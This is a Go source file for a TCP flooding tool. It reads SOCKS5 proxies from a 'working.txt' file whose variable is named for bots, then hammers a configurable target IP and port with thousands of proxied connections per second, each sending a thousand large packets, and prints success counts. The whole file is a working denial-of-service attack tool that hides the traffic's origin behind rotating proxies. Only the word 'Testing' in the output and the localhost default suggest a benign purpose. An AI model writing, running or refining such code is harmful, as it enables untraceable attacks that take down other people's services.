package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

func main() {
	target := flag.String("target", "127.0.0.1", "Target IP")
	port := flag.Int("port", 8443, "Target port")
	rps := flag.Int("rps", 15000, "Connections per second")
	timeout := flag.Duration("timeout", 2*time.Second, "Connection timeout")
	TCPPacketSize := flag.Int("size", 2469, "Bytes per packet")
	TCPPacketsPerConnection := flag.Int("pps", 1000, "Packets per connection")
	WorkingBotsFile := flag.String("proxies", "working.txt", "File with proxies")
	flag.Parse()

	addr := fmt.Sprintf("%s:%d", *target, *port)
	fmt.Printf("Testing Targ => %s:%d at %d connections/sec, %d bytes per packet, %d packets per connection.\nCtrl+C to stop.\n",
		*target, *port, *rps, *TCPPacketSize, *TCPPacketsPerConnection)

	file, err := os.Open(*WorkingBotsFile)
	if err != nil {
		fmt.Printf("Failed to open proxy file: %v\n", err)
		return
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}

	if len(proxies) == 0 {
		fmt.Println("No proxies found. Exiting.")
		return
	}

	var success uint64
	var failure uint64
	payload := make([]byte, *TCPPacketSize)

	ticker := time.NewTicker(time.Second / time.Duration(*rps))
	defer ticker.Stop()
	NewTimeTicker := time.NewTicker(1 * time.Second)
	defer NewTimeTicker.Stop()

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	for {
		select {
		case <-stop:
			fmt.Println("\nStopped by user.")
			return
		case <-ticker.C:
			go func() {
				proxyAddr := proxies[time.Now().UnixNano()%int64(len(proxies))]
				dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
				if err != nil {
					atomic.AddUint64(&failure, 1)
					return
				}

				conn, err := dialer.Dial("tcp", addr)
				if err != nil {
					atomic.AddUint64(&failure, 1)
					return
				}
				defer conn.Close()

				conn.SetDeadline(time.Now().Add(*timeout))

				for i := 0; i < *TCPPacketsPerConnection; i++ {
					_, err := conn.Write(payload)
					if err != nil {
						atomic.AddUint64(&failure, 1)
						return
					}
					atomic.AddUint64(&success, 1)
				}
			}()
		case <-NewTimeTicker.C:
			s := atomic.SwapUint64(&success, 0)
			f := atomic.SwapUint64(&failure, 0)
			fmt.Printf("Success: %d, Failed: %d\n", s, f)
		}
	}
}
